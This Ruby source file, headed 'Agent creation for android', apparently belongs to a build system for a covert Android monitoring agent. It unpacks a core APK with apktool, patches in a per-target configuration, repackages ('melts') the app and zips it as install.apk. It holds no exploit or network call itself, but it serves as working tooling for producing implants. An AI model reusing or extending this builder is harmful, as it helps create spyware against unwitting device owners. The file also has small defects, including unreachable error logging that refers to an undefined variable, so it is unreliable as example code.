#
#  Agent creation for android
#

# from RCS::Common
require 'rcs-common/trace'

require 'find'

module RCS
module DB

class BuildAndroid < Build

  def initialize
    super
    @platform = 'android'
  end

  def unpack
    super

    trace :debug, "Build: apktool extract: #{@tmpdir}/apk"

    apktool = path('apktool.jar')
    core = path('core')

    system "java -jar #{apktool} d #{core} #{@tmpdir}/apk" or raise("cannot unpack with apktool")
    #output = %x["java -jar #{apktool} d #{core} #{@tmpdir}/apk"]
    #$?.success? || raise("cannot unpack with apktool")

    if File.exist?(path('apk/res/raw/resources.bin'))
      @outputs << ['apk/res/raw/resources.bin', 'apk/res/raw/config.bin']
    else
      raise "unpack failed. needed file not found"
    end
  end

  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'apk/res/raw/resources.bin'
    params[:config] = 'apk/res/raw/config.bin'

    # invoke the generic patch method with the new params
    super

  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    apktool = path('apktool.jar')
    core = path('output.apk')

    File.chmod(0755, path('aapt'))
    
    system("java -jar #{apktool} b #{@tmpdir}/apk #{core}", {:chdir => @tmpdir})
    #or raise("cannot pack with apktool")
    #output = %x["java -jar #{apktool} b #{@tmpdir}/apk #{core}"]
    #$?.success? || raise("cannot pack with apktool")

    if File.exist?(core)
      @outputs = ['output.apk']
    else
      raise "pack failed."
      trace :error, output
    end

  end


  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      z.file.open('install.apk', "w") { |f| f.write File.open(path('output.apk'), 'rb') {|f| f.read} }
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

end

end #DB::
end #RCS::
